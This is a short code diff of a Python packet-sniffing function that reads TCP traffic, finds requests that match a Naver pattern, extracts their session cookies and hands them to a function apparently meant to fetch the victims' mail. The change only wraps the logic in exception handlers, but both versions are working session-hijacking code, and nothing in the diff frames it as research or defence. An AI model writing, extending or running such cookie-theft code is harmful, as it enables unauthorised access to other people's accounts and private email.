@@ -15,29 +15,29 @@ def cookie_sniff(packet):
     global naver_reg
     global redundance_remove
     global i
-    #try:
-    if packet.haslayer("TCP"):
-        
-        try:
-            byte_pkt = packet.getlayer("TCP").payload.load.decode()
-        except:
-            return
-        if len(naver_reg.findall(byte_pkt)) != 0:
-            cookie_start_idx = byte_pkt.find("Cookie: ")
-            if cookie_start_idx != -1:
-                cookie_end_idx = byte_pkt.find("\x0d\x0a", cookie_start_idx)
-                cookie = byte_pkt[cookie_start_idx : cookie_end_idx]
-                if cookie not in redundance_remove:
-                    redundance_remove.append(cookie)
-                   # try:
-                    COOKIE_HASH_TABLE = cookie_parsing(cookie)
-                    mail_json_sniff(COOKIE_HASH_TABLE)
-                    #except:
-                       # pass
-                else:
-                    return
-    #except:
-     #   pass
+    try:
+        if packet.haslayer("TCP"):
+            
+            try:
+                byte_pkt = packet.getlayer("TCP").payload.load.decode()
+            except:
+                return
+            if len(naver_reg.findall(byte_pkt)) != 0:
+                cookie_start_idx = byte_pkt.find("Cookie: ")
+                if cookie_start_idx != -1:
+                    cookie_end_idx = byte_pkt.find("\x0d\x0a", cookie_start_idx)
+                    cookie = byte_pkt[cookie_start_idx : cookie_end_idx]
+                    if cookie not in redundance_remove:
+                        redundance_remove.append(cookie)
+                        try:
+                            COOKIE_HASH_TABLE = cookie_parsing(cookie)
+                            mail_json_sniff(COOKIE_HASH_TABLE)
+                        except:
+                            pass
+                    else:
+                        return
+    except:
+       pass
 
 
 def cookie_parsing(cookie):
